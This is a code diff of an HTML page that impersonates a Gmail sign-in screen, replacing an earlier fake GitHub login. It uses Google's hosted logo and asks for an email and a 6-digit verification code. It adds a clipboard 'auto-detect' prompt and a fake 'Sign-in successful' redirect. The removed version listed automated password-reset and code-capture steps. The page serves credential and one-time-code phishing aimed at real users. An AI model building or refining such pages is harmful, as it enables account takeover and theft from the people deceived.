@@ -3,87 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub - Sign in</title>
+    <title>Gmail - Sign in</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <!-- Copy Code Button -->
+    <button id="copyCodeBtn" class="copy-code-btn" title="Copy all code">
+        <i class="fas fa-copy"></i> Copy Code
+    </button>
+
     <div class="container">
-        <!-- Step 1: Email -->
-        <div class="step active" id="step1">
+        <!-- First Page: Gmail Login -->
+        <div id="loginPage" class="login-box">
             <div class="logo">
-                <svg viewBox="0 0 16 16" width="48" height="48">
-                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-                </svg>
+                <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" alt="Gmail">
             </div>
             
-            <h1 class="title">Sign in to GitHub</h1>
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
             
             <div class="input-group">
-                <label for="email">Username or email address</label>
-                <input type="email" id="email" placeholder="Enter your email" autocomplete="username">
-                <div class="error" id="emailError">Please enter a valid email</div>
+                <input type="email" id="email" placeholder="Email or phone" autofocus>
+                <div class="input-icon">
+                    <i class="fas fa-envelope"></i>
+                </div>
             </div>
             
-            <button class="btn" onclick="nextStep()">
-                <span class="btn-text">Next</span>
-                <div class="loading-spinner"></div>
-            </button>
+            <a href="#" class="forgot-email">Forgot email?</a>
             
-            <div class="forgot-password">
-                <a href="#" onclick="forgotPassword()">Forgot password?</a>
+            <div class="disclaimer">
+                <i class="fas fa-info-circle"></i>
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
             </div>
             
-            <div class="footer">
-                <p>New to GitHub? <a href="#">Create an account</a></p>
+            <div class="button-group">
+                <a href="#" class="create-account">
+                    <i class="fas fa-user-plus"></i> Create account
+                </a>
+                <button id="nextBtn" class="next-btn">
+                    Next <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
             </div>
         </div>
         
-        <!-- Step 2: Password -->
-        <div class="step" id="step2">
+        <!-- Second Page: Code Verification -->
+        <div id="secondPage" class="login-box second-page">
             <div class="logo">
-                <svg viewBox="0 0 16 16" width="48" height="48">
-                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-                </svg>
+                <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" alt="Gmail">
             </div>
             
-            <h1 class="title">Enter your password</h1>
-            <p class="subtitle" id="userEmailDisplay">user@example.com</p>
+            <h1 class="title">Enter verification code</h1>
+            <p class="subtitle">To continue, Google needs to verify it's you</p>
             
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
-                <div class="error" id="passwordError">Please enter your password</div>
+            <div class="loading-container">
+                <div class="loading"></div>
+                <p class="loading-text">Checking your account...</p>
             </div>
             
-            <button class="btn" onclick="submitLogin()">
-                <span class="btn-text">Sign in</span>
-                <div class="loading-spinner"></div>
-            </button>
+            <div class="instructions">
+                <i class="fas fa-shield-alt"></i>
+                A 6-digit verification code was sent to your email.
+                <br>Enter it below to sign in.
+            </div>
             
-            <div class="forgot-password">
-                <a href="#" onclick="goBack()">← Back</a>
+            <div class="code-input-container">
+                <input 
+                    type="text" 
+                    id="codeInput" 
+                    class="code-input"
+                    placeholder="Enter 6-digit code"
+                    maxlength="6"
+                    pattern="\d{6}"
+                    autocomplete="off"
+                >
+                <div class="input-icon">
+                    <i class="fas fa-key"></i>
+                </div>
+                <button id="autoDetectBtn" class="auto-detect-btn">
+                    <i class="fas fa-magic"></i> Auto-detect
+                </button>
+            </div>
+            
+            <div class="hint">
+                <i class="fas fa-lightbulb"></i>
+                <strong>Tip:</strong> The code looks like "G-123456" or "123456"
+            </div>
+            
+            <div class="input-info">
+                <i class="far fa-clock"></i>
+                Code expires in <span id="timer">05:00</span>
+            </div>
+            
+            <div class="error-message" id="errorMsg">
+                <i class="fas fa-exclamation-circle"></i>
+                Invalid code. Please try again.
+            </div>
+            
+            <div class="success-message" id="successMsg">
+                <i class="fas fa-check-circle"></i>
+                Code verified successfully!
+            </div>
+            
+            <div class="button-group-vertical">
+                <button id="verifyBtn" class="verify-btn" disabled>
+                    <i class="fas fa-check"></i> Verify
+                </button>
+                <button id="resendBtn" class="secondary-btn">
+                    <i class="fas fa-redo"></i> Resend code
+                </button>
+            </div>
+            
+            <div class="resend-info">
+                Didn't get the code? 
+                <a href="#" id="resendLink">Resend</a>
+                or
+                <a href="#" id="changeEmailLink">use another email</a>
             </div>
         </div>
         
-        <!-- Step 3: Verification -->
-        <div class="step" id="step3">
-            <div class="logo">
-                <svg viewBox="0 0 16 16" width="48" height="48">
-                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
-                </svg>
+        <!-- Third Page: Success -->
+        <div id="successPage" class="login-box success-page">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
             </div>
             
-            <h1 class="title">Verify your identity</h1>
-            <p class="subtitle">We've sent a verification code to your email</p>
+            <h1 class="title">Sign-in successful!</h1>
+            <p class="subtitle">Redirecting to your Gmail inbox...</p>
             
-            <div class="auto-process">
-                <div class="process-step">
-                    <div class="status-icon" id="step1Status">1</div>
-                    <span>Sending password reset request...</span>
-                </div>
-                <div class="process-step">
-                    <div class="status-icon" id="step2Status">2</div>
-                    <span>Waiting for verification code...</span>
-                </div>
-                <div class="process-step">
-                    <div class="status-icon" id="step3Status">3
+            <div class="loading-container">
+                <div class="loading"></div>
+            </div>
+            
+            <div class="redirect-info">
+                <i class="fas fa-info-circle"></i>
+                Please wait while we redirect you.
+            </div>
+        </div>
+    </div>
+
+    <!-- Auto-detect Modal -->
+    <div id="autoDetectModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fas fa-magic"></i>
+            </div>
+            <h2 class="modal-title">Code Detected!</h2>
+            <p class="modal-text">
+                We found a verification code in your clipboard:
+            </p>
+            <div class="modal-code" id="detectedCode">G-123456</div>
+            <p class="modal-text">
+                Would you like to use this code?
+            </p>
+            <div class="modal-buttons">
+                <button id="modalCancelBtn" class="modal-btn secondary">
+                    Cancel
+                </button>
+                <button id="modalAcceptBtn" class="modal-btn primary">
+                    Use This Code
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Code Copied Notification -->
+    <div id="copyNotification" class="notification">
+        <i class="fas fa-check"></i> All code copied to clipboard!
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
